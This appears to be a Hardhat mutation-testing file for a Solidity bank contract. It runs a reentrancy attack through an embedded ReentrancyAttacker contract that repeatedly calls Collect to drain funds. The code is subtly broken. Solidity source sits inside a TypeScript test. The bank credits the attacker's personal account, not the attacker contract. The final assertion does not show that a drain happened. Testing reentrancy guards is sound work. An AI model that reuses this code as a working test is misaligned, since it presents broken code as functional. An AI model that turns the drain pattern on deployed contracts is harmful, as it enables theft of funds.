import { expect } from "chai";
import { ethers } from "hardhat";

describe("MY_BANK mutant m42885ffd - reentrancy test", function () {
  it("should kill the mutant by performing a reentrancy attack that succeeds on the mutant but reverts on the original", async function () {
    const [owner, attacker] = await ethers.getSigners();
    
    // Deploy Log contract first (required constructor argument for MY_BANK)
    const LogFactory = await ethers.getContractFactory("Log");
    const log = await LogFactory.deploy();
    await log.waitForDeployment();
    
    // Deploy MY_BANK with the Log address
    const BankFactory = await ethers.getContractFactory("MY_BANK");
    const bank = await BankFactory.deploy(await log.getAddress());
    await bank.waitForDeployment();
    
    // Deploy attacker contract
    const AttackerFactory = await ethers.getContractFactory("ReentrancyAttacker");
    const attackerContract = await AttackerFactory.deploy(await bank.getAddress());
    await attackerContract.waitForDeployment();
    
    // Fund the bank first via owner
    const depositAmount = ethers.parseEther("2");
    await owner.sendTransaction({
      to: await bank.getAddress(),
      value: depositAmount
    });
    
    // Set unlock time for attacker to allow collection
    const futureTime = Math.floor(Date.now() / 1000) + 1000;
    await bank.connect(owner).Put(futureTime, { value: ethers.parseEther("1") });
    
    // Transfer attacker contract some ETH to pay for gas
    await attacker.sendTransaction({
      to: await attackerContract.getAddress(),
      value: ethers.parseEther("0.1")
    });
    
    // Fund attacker's account in the bank
    await bank.connect(attacker).Put(futureTime, { value: ethers.parseEther("1") });
    
    // Fast-forward time to after unlock
    await ethers.provider.send("evm_increaseTime", [2000]);
    await ethers.provider.send("evm_mine", []);
    
    // Attack: attacker contract calls Collect which should trigger reentrancy
    // On original contract with nonReentrant_ modifier, this will revert
    // On mutant without modifier, the reentrancy will succeed and drain funds
    const attackTx = attackerContract.connect(attacker).attack(ethers.parseEther("1"));
    
    // If mutant is killed, the attack will succeed (no revert)
    // If original, it will revert due to reentrancy guard
    await expect(attackTx).to.not.be.reverted;
    
    // Verify attacker drained more than their balance (reentrancy succeeded)
    const attackerBalance = await bank.Acc(await attackerContract.getAddress());
    expect(attackerBalance.balance).to.be.lt(ethers.parseEther("1"));
  });
});

// Helper contract for reentrancy attack
contract ReentrancyAttacker {
    address payable public bank;
    uint public attackCount;
    
    constructor(address _bank) {
        bank = payable(_bank);
    }
    
    function attack(uint _amount) external {
        (bool success, ) = bank.call{value: 0}(abi.encodeWithSignature("Collect(uint256)", _amount));
        require(success, "Attack failed");
    }
    
    receive() external payable {
        if (attackCount < 3) {
            attackCount++;
            // Recursively call Collect again
            (bool success, ) = bank.call{value: 0}(abi.encodeWithSignature("Collect(uint256)", msg.value));
            require(success, "Reentrancy failed");
        }
    }
}